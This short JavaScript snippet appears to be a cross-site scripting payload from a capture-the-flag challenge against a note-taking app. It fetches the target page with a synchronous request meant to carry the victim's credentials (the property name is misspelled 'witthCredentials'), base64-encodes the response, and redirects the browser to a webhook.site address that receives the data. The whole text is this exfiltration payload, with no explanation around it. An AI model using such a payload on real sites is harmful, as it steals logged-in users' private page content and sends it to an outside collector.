var req = new XMLHttpRequest();
req.open("GET", "http://politenotepad.zajebistyc.tf/", false);
req.witthCredentials = true;
req.send(null)
var res = req.responseText;

location.href="https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?b=" + btoa(res)
